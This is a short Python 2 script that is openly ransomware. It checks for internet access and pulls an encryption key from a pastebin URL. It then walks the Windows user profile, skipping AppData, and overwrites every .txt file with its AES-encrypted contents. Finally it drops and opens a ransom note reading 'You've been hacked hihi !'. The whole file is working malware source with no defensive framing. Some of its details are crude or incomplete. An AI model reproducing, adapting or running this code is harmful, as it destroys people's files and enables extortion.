import os, sys, fnmatch, base64, urllib, webbrowser, socket
from Crypto import Random
from Crypto.Cipher import AES

class AESCipher:

    def __init__(self, key):
        self.bs = 32
        if len(key) >= 32:
            self.key = key[:32]
        else:
            self.key = self._pad(key)

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw))

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:]))

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    def _unpad(self, s):
        return s[:-ord(s[len(s) - 1:])]


def crypt(password, files):
    aes = AESCipher(password)
    mode = 'encrypt'
    for path in files:
        ifp = open(path, 'rb')
        data = ifp.read()
        ifp.close()
        try:
            ofp = open(path, 'wb')
            ofp.write(aes.encrypt(data))
            ofp.close()
        except ValueError:
            print '%s operation failed, skipping %s' % (mode, path)


def isConnected():
    try:
        host = socket.gethostbyname('www.google.com')
        s = socket.create_connection((host, 80), 2)
        return True
    except:
        pass
    return False

def main():
    if isConnected():
        password = base64.b64decode(urllib.urlopen('https://pastebin.com/').read())
    else:
        password = base64.b64decode('')
    matches = []
    for root, dirnames, filenames in os.walk(os.environ['USERPROFILE']):
        if 'AppData' in dirnames:
            dirnames.remove('AppData')
        else:
            for extension in ['txt']:
                for filename in fnmatch.filter(filenames, '*.' + extension):
                    matches.append(os.path.join(root, filename))

    files = matches
    crypt(password, files)
    ransom_text = "You've been hacked hihi !"
    with open('ransom.txt', 'w') as (ransom_output):
        ransom_output.write(ransom_text)
    os.startfile('ransom.txt')

main()
